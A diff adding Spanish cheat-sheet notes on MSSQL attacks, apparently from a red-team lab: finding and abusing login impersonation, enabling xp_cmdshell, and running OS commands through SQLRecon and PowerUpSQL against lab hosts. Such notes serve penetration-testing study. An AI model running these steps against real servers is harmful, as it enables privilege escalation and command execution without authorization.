@@ -495,3 +495,55 @@ Acceder desde una maquina Linux con mssqlclient.py
 ```
 proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
 ```
+## Impersonation
+
+Mirar qué usuarios con (ID X) tienen permisos para impersonar a otros usuarios con ID...
+```
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+```
+Mirar que usuarios pertenecen a ese ID
+```
+SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
+```
+Impersonar al usuario
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
+```
+Ejecutar comandos como el usuario
+```
+EXECUTE AS login = 'domain\user'; SELECT SYSTEM_USER;
+```
+Ejecutar SQLRecon con el usuario impersonado
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:HOST,1433 /m:iwhoami /i:DEV\mssql_svc
+```
+## Command Execution
+Ejecutar codigo con PowerUpSQL
+```
+powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+```
+### Query
+Mirar si XP_CMDSHELL esta activado
+```
+SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
+```
+Habilitarlo en caso de que esté desactivado
+```
+sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+```
+```
+sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+Ejecutar comandos
+```
+EXEC xp_cmdshell "whoami";
+```
+### SQLRecon
+Habilitar XP_CMDSHELL
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
+```
+Ejectuar codigo con XP_CMDSHELL
+```
+execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
+```
